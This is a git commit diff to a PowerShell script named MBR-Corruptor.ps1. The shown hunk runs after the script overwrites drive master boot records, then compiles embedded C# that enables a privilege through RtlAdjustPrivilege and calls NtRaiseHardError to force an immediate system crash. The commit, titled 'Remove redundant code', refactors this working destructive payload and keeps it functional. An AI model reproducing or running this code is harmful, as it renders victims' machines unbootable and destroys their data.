6ca2bab7084e3056d5be4a43abc555768b24f5da
skimask1690 <123434315+skimask1690@users.noreply.github.com>
2025-06-15 03:36:57 -0400

    Remove redundant code

--- MBR-Corruptor.ps1
+++ MBR-Corruptor.ps1
@@ -50,27 +50,26 @@ foreach ($drive in $drives) {
 # Only execute Add-Type if at least one MBR was modified
 if ($mbrOverwritten) {
 
-    $source = @"
+    $src = @"
 using System;
 using System.Runtime.InteropServices;
 
 public static class CS {
-	[DllImport("ntdll.dll")]
-	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+	[DllImport("ntdll")]
+	public static extern uint RtlAdjustPrivilege(int p, bool e, bool t, out bool pv);
 
-	[DllImport("ntdll.dll")]
-	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+	[DllImport("ntdll")]
+	public static extern uint NtRaiseHardError(uint s, uint n, uint m, IntPtr p, uint o, out uint r);
 
-	public static unsafe void Kill() {
-		Boolean tmp1;
-		uint tmp2;
-		RtlAdjustPrivilege(19, true, false, out tmp1);
-		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
+	public static void Kill() {
+		bool b; uint u;
+		RtlAdjustPrivilege(19, true, false, out b);
+		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out u);
 	}
 }
 "@
-    $comparams = New-Object -Type CodeDom.Compiler.CompilerParameters
-    $comparams.CompilerOptions = '/unsafe'
-    Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
-    [CS]::Kill()
-}
+
+Add-Type -TypeDefinition $src
+
+[CS]::Kill()
+
